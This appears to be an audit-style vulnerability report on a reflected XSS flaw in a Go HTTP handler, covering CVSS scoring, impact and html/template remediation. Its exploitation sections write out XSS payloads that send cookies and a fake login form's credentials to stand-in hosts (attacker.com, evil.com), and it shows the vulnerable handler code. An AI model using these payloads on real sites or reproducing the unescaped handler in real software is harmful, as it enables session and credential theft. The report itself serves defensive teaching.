# Cross-Site Scripting (XSS) via Unescaped User Input in Go HTTP Handler

# Vulnerability Case
During a code audit of Acme Corp's Go-based web service, we discovered that certain HTTP handlers were directly writing user-supplied input to the response using `http.ResponseWriter.Write()`, bypassing the built-in HTML escaping capabilities of the `html/template` package. In one instance, unsanitized query parameters were concatenated directly into the output HTML, exposing the application to cross-site scripting (XSS) risks. The vulnerability was identified during a security review of the codebase that handles dynamic content rendering in the server's endpoints deployed on a standard Go stack (using the `net/http` package). Direct output without proper escaping enables an attacker to inject and execute arbitrary JavaScript in a victim's browser when they visit a specially crafted URL, potentially leading to session data disclosure or unauthorized actions. The finding highlights a medium-severity flaw in the rendering logic that requires user interaction to exploit.

```go
package main

import (
        "fmt"
        "net/http"
)

func vulnerableHandler(w http.ResponseWriter, r *http.Request) {
        // Retrieve user input without sanitization
        user := r.URL.Query().Get("user")
        // Vulnerable pattern: Directly writing unsanitized data to the response writer
        w.Write([]byte("<html><body>Welcome, " + user + "!</body></html>"))
}

func main() {
        http.HandleFunc("/greet", vulnerableHandler)
        fmt.Println("Server running on :8080")
        http.ListenAndServe(":8080", nil)
}
```

The vulnerability stems from the direct concatenation of untrusted input into HTML output via `w.Write()`, bypassing the proper escaping process provided by the `html/template` package. This allows an attacker to inject crafted payloads (e.g., `<script>` tags) through HTTP parameters, which the browser can execute when a user visits the malicious URL. While this could lead to session hijacking or credential theft, the impact is limited by the requirement for user interaction and the browser context of the attack, resulting in a medium severity assessment. The vulnerability represents a significant security misconfiguration that should be addressed through proper use of templating and input validation.

context: go.lang.security.audit.xss.no-direct-write-to-responsewriter.no-direct-write-to-responsewriter Detected directly writing or similar in 'http.ResponseWriter.write()'. This bypasses HTML escaping that prevents cross-site scripting vulnerabilities. Instead, use the 'html/template' package and render data using 'template.Execute()'.

# Vulnerability Breakdown
This vulnerability involves direct inclusion of user-supplied input into HTML output without proper escaping, creating a high-risk cross-site scripting (XSS) vulnerability in Acme Corp's Go-based web service.

1. **Key vulnerability elements**:
   - User input from URL query parameters is directly concatenated into HTML output
   - The application bypasses Go's built-in `html/template` security protections
   - No sanitization or validation of user input before rendering
   - Direct writing to `http.ResponseWriter` without proper escaping
   - Standard Go web server running on network-accessible endpoints

2. **Potential attack vectors**:
   - Crafted URLs containing malicious JavaScript in the `user` parameter
   - Phishing campaigns distributing malicious links to users
   - Social engineering attacks tricking users into visiting specially crafted URLs
   - Potentially wormable if the payload can auto-distribute to other users

3. **Severity assessment**:
   - The vulnerability allows injection and execution of arbitrary JavaScript in victim browsers
   - Attackers can steal session cookies, credentials, and sensitive data
   - Possibility of session hijacking and unauthorized account access
   - Requires user interaction (clicking malicious links)
   - No special privileges required to exploit

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

# Description
A Cross-Site Scripting (XSS) vulnerability exists in Acme Corp's Go-based web service, specifically in the HTTP handler function that processes user greetings. The vulnerable code directly concatenates unsanitized user input from URL query parameters into HTML output without proper escaping, bypassing the security protections provided by Go's `html/template` package.

```go
func vulnerableHandler(w http.ResponseWriter, r *http.Request) {
	// Retrieve user input without sanitization
	user := r.URL.Query().Get("user")
	// Vulnerable pattern: Directly writing unsanitized data to the response writer
	w.Write([]byte("<html><body>Welcome, " + user + "!</body></html>"))
}

```

This implementation allows attackers to inject arbitrary JavaScript code through the `user` parameter, which will be executed in victims' browsers when they visit the maliciously crafted URL. Such injected scripts can steal cookies, hijack sessions, redirect users to malicious sites, or perform actions on behalf of the victim, presenting a significant security risk to users of the application.

# CVSS
**Score**: 5.3 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N \
**Severity**: Medium

The Medium severity rating (CVSS score 5.3) is based on the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability is exploitable remotely through the internet as it exists in a web service accessible to users.

- **Low Attack Complexity (AC:L)**: Exploitation is straightforward and does not require specialized knowledge or complex attack conditions. An attacker simply needs to craft a URL with malicious JavaScript code in the query parameter.

- **No Privileges Required (PR:N)**: The vulnerable endpoint does not require authentication, allowing any user to exploit it.

- **User Interaction Required (UI:R)**: A successful attack depends on a victim visiting a maliciously crafted URL, which reduces the severity somewhat as it requires social engineering or other means to trick users.

- **Unchanged Scope (S:U)**: The vulnerability does not allow the attacker to affect components beyond the vulnerable service itself.

- **Low Confidentiality Impact (C:L)**: The vulnerability can lead to disclosure of cookies and session data, but is generally limited to web browser context data rather than backend system information.

- **Low Integrity Impact (I:L)**: Attackers can modify content displayed to users and potentially alter form submissions, but cannot directly modify server-side data.

- **No Availability Impact (A:N)**: The vulnerability does not affect the availability of the service.

The combination of these factors results in a Medium severity vulnerability that requires prompt remediation.

# Exploitation Scenarios
**Scenario 1: Session Cookie Theft**
An attacker crafts a malicious URL targeting the vulnerable endpoint: `http://acme-app.com/greet?user=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`. The attacker distributes this URL via phishing emails to Acme Corp users. When a victim clicks the link, their browser renders the welcome message and executes the injected script, sending their session cookies to the attacker's server. The attacker can then use these stolen cookies to impersonate the victim and gain unauthorized access to their account.

**Scenario 2: Credential Harvesting**
An attacker creates a more sophisticated XSS payload that injects a fake login form into the page: `http://acme-app.com/greet?user=<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999"><h2>Session Expired</h2><form onsubmit="fetch('https://attacker.com/steal',{method:'POST',body:new FormData(this)});return false"><input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password"><button>Login</button></form></div>`. When a user visits this URL, they see what appears to be a login form. If they enter their credentials, the data is sent to the attacker's server while the user remains unaware of the attack.

**Scenario 3: Stored XSS Escalation**
If the vulnerable application stores the user parameter value in a database and displays it to other users without proper escaping (for example, in a user profile or comment system), the attack could evolve into a stored XSS vulnerability. In this scenario, the attacker only needs to inject the malicious payload once, after which any user viewing the affected content would have the malicious script executed in their browser, potentially affecting many users without requiring them to click on a specially crafted link.

# Impact Analysis
**Business Impact:**
- Loss of customer trust if user accounts are compromised
- Potential regulatory penalties under data protection laws like GDPR or CCPA if personal data is exposed
- Reputational damage if exploits become public
- Costs associated with incident response, customer notification, and remediation
- Potential legal liability if user data is compromised
- Business disruption during emergency patching

**Technical Impact:**
- Unauthorized access to user accounts through session hijacking
- Theft of sensitive user information including cookies, session tokens, and potentially credentials
- Ability for attackers to perform actions on behalf of compromised users
- Potential for defacement of application content as seen by users
- Circumvention of CSRF protections that rely on same-origin policy
- Injection of malicious content that could lead to browser exploits
- Possibility of using the XSS as a stepping stone for more sophisticated attacks
- Potential for self-propagating attacks if combined with social features

# Technical Details
The vulnerability exists in the `vulnerableHandler` function which directly concatenates user input into HTML output without any sanitization or escaping:

```go
func vulnerableHandler(w http.ResponseWriter, r *http.Request) {
	// Retrieve user input without sanitization
	user := r.URL.Query().Get("user")
	// Vulnerable pattern: Directly writing unsanitized data to the response writer
	w.Write([]byte("<html><body>Welcome, " + user + "!</body></html>"))
}

```

**Vulnerability Mechanics:**

The core issue is that untrusted input from the URL query parameter `user` is inserted directly into the HTML document without any form of escaping. When special characters like `<`, `>`, and `"` are included in the input, they retain their HTML meaning rather than being rendered as literal text.

For example, if an attacker sets the `user` parameter to `<script>alert('XSS')</script>`, the resulting HTML would be:

```html
<html><body>Welcome, <script>alert('XSS')</script>!</body></html>

```

The browser interprets this as valid HTML with an embedded script tag and executes the JavaScript code.

**Exploit Mechanism:**

To exploit this vulnerability, an attacker constructs a URL with a specially crafted `user` parameter containing JavaScript code:

```
http://acme-app.com/greet?user=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

```

When a victim visits this URL, their browser:
1. Makes a request to the server
2. Receives the HTML response with the injected script
3. Parses the HTML and executes the embedded JavaScript
4. The malicious script runs with the same privileges as the origin site
5. The script can access cookies, session tokens, and perform actions on behalf of the user

**Technical Root Cause:**

Go's standard library provides the `html/template` package specifically designed to prevent XSS attacks through automatic context-aware escaping, but the vulnerable code bypasses this protection by directly writing to the response writer. This demonstrates a fundamental security anti-pattern in Go web development where developers mistakenly use direct string concatenation instead of the provided secure templating mechanisms.

# Remediation Steps
## Use Go's html/template Package for Proper Escaping

**Priority**: P0

Replace the direct string concatenation with Go's built-in `html/template` package, which automatically escapes HTML special characters:

```go
package main

import (
	"fmt"
	"html/template"
	"net/http"
)

// Define a template
const tmpl = `<html><body>Welcome, {{.}}!</body></html>`

func safeHandler(w http.ResponseWriter, r *http.Request) {
	// Retrieve user input
	user := r.URL.Query().Get("user")

	// Parse the template
	t, err := template.New("welcome").Parse(tmpl)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Execute the template with proper HTML escaping
	err = t.Execute(w, user)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

func main() {
	http.HandleFunc("/greet", safeHandler)
	fmt.Println("Server running on :8080")
	http.ListenAndServe(":8080", nil)
}

```

This solution uses Go's templating system which automatically escapes the provided data based on the context in which it appears. The `{{.}}` syntax is a placeholder that will be replaced with the properly escaped user input, preventing any HTML/JavaScript injection.
## Implement Content Security Policy (CSP)

**Priority**: P1

Add Content Security Policy headers to provide an additional layer of defense against XSS attacks:

```go
func safeHandlerWithCSP(w http.ResponseWriter, r *http.Request) {
	// Set Content Security Policy header
	w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'; object-src 'none'")

	// Retrieve user input
	user := r.URL.Query().Get("user")

	// Parse the template
	t, err := template.New("welcome").Parse(tmpl)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Execute the template with proper HTML escaping
	err = t.Execute(w, user)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

```

This adds a Content Security Policy that restricts what resources can be loaded and executed on the page. The policy above only allows scripts from the same origin ('self') and blocks object embedding completely, providing defense-in-depth against XSS even if escaping somehow fails.
## Input Validation and Sanitization

**Priority**: P1

Implement input validation to reject potentially malicious input before processing:

```go
func validateAndSanitizeInput(input string) (string, error) {
	// Define allowed characters (example: alphanumeric and basic punctuation)
	if len(input) > 100 {
		return "", fmt.Errorf("input too long")
	}

	// Optional: Additional sanitization or transformation
	// For example, you might want to strip HTML tags entirely:
	// sanitized := strings.ReplaceAll(strings.ReplaceAll(input, "<", "&lt;"), ">", "&gt;")
	// return sanitized, nil

	// For this case, we'll rely on html/template for escaping, but still validate length
	return input, nil
}

func enhancedSafeHandler(w http.ResponseWriter, r *http.Request) {
	// Retrieve and validate user input
	input := r.URL.Query().Get("user")
	user, err := validateAndSanitizeInput(input)
	if err != nil {
		http.Error(w, "Invalid input", http.StatusBadRequest)
		return
	}

	// Set security headers
	w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'; object-src 'none'")
	
	// Use template with proper escaping
	t, err := template.New("welcome").Parse(tmpl)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	err = t.Execute(w, user)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
	}
}

```

This approach combines multiple layers of defense by validating input, applying security headers, and using proper template escaping. The validation function can be expanded to implement specific business rules about what constitutes valid input.


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* A05:2021 | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
* XSS Prevention | [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
